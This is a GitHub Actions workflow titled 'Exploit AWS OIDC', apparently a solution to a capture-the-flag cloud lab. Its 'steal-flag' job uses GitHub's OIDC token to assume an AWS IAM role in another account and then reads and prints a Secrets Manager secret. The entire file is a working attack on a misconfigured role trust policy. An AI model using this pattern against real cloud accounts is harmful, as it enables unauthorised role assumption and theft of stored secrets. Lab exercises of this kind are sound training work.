name: Exploit AWS OIDC
on:
  workflow_dispatch:
  push:
    branches: [ "main" ]
permissions:
  id-token: write
  contents: read
jobs:
  steal-flag:
    runs-on: ubuntu-latest
    steps:
      - name: Assume Role via GitHub OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::556300512497:role/sts-lab-2-target
          aws-region: us-east-1
      - name: Verify Assumed Role Caller
        run: |
          aws sts get-caller-identity
      - name: Retrieve STS Lab 2 Flag
        run: |
          echo "=== Reading Lab 2 Secret Value ==="
          aws secretsmanager get-secret-value \
            --secret-id "arn:aws:secretsmanager:us-east-1:556300512497:secret:flag_sts_lab_2-bZ2Dit" \
            --query "SecretString" \
            --output text
